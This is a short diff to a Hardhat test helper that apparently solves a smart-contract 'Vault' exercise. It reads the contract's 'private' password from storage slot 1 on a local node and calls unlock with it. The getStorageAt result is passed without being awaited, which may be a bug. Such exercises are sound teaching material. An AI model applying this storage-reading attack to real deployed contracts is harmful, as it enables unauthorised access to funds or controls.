@@ -1,4 +1,4 @@
-import { expect } from "chai";
+
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
@@ -8,6 +8,11 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  const addr = victim.address;
+  const provider = new ethers.providers.JsonRpcProvider("http://127.0.0.1:8545/");
+  let Password = provider.getStorageAt(addr, 1);
+  //let Password = ethers.utils.formatBytes32String("A very strong password");
+  await victim.unlock(Password);
 };
 
 export default helper;
